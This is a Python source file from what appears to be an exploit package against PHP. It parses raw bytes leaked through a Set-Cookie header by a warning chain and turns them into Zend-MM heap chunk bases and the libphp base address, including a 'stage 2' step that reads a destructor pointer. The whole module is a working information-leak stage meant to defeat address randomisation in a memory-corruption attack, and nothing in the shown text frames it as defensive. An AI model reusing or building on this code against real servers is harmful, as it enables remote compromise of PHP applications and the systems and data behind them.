"""Leak parsing for the clean-room p2s package (docs/76 R1/R2).

The warning chain leaks raw bytes through a Set-Cookie value.  This module
turns those bytes into candidate 2 MiB Zend-MM chunk bases and libphp bases.
It is deliberately independent of the wire format: callers pass bytes.
"""
from __future__ import annotations

import struct

CHUNK_SIZE = 0x200000
# Canonical user-space window (1 TiB .. 64 PiB); the exact bounds are not
# security-relevant, they only reject fill patterns and kernel addresses.
MIN_USER = 1 << 40
MAX_USER = 1 << 56


class LeakError(ValueError):
    """The leaked bytes did not contain a usable candidate."""


def _u64(data: bytes, off: int) -> int:
    return struct.unpack_from("<Q", data, off)[0]


def plausible_pointer(value: int) -> bool:
    if value < MIN_USER or value >= MAX_USER:
        return False
    if value & 7:
        return False
    raw = value.to_bytes(8, "little")
    return len(set(raw)) > 2          # reject 0x00/0x41/0x51 fills


def chunk_candidates(data: bytes, *, step: int = 8, min_votes: int = 2,
                     limit: int | None = None) -> list[int]:
    """Rank 2 MiB-aligned bases by how many leaked pointers fall inside."""
    counts: dict[int, int] = {}
    for off in range(0, max(0, len(data) - 8) + 1, step):
        value = _u64(data, off)
        if not plausible_pointer(value):
            continue
        base = value & ~(CHUNK_SIZE - 1)
        inside = value - base
        if 0x1000 <= inside < CHUNK_SIZE:
            counts[base] = counts.get(base, 0) + 1
    if not counts:
        raise LeakError("no plausible heap pointers in %d bytes" % len(data))
    ranked = sorted(counts.items(), key=lambda kv: (-kv[1], kv[0]))
    out = [base for base, votes in ranked if votes >= min_votes]
    if not out:
        raise LeakError("no base with >=%d votes (best=%d)"
                        % (min_votes, ranked[0][1]))
    return out[:limit] if limit else out


def libphp_base(pointer: int, dtor_offset: int) -> int:
    """Convert a libphp data pointer to the PIE base."""
    base = pointer - dtor_offset
    if base <= 0 or base & 0xFFF:
        raise LeakError("bad libphp pointer 0x%x (base 0x%x)"
                        % (pointer, base))
    if not (MIN_USER <= base < MAX_USER):
        raise LeakError("libphp base outside user space: 0x%x" % base)
    return base


def libphp_from_cookie(raw: bytes, dtor_offset: int) -> int:
    """Stage 2: bytes[8:16] is nNextFreeElement|pDestructor."""
    if len(raw) < 16:
        raise LeakError("stage2 cookie too short (%d bytes)" % len(raw))
    pointer = int.from_bytes(raw[8:16], "little")
    if (pointer & 0xFFF) != (dtor_offset & 0xFFF):
        raise LeakError("stage2 pointer 0x%x is not dtor-aligned" % pointer)
    return libphp_base(pointer, dtor_offset)
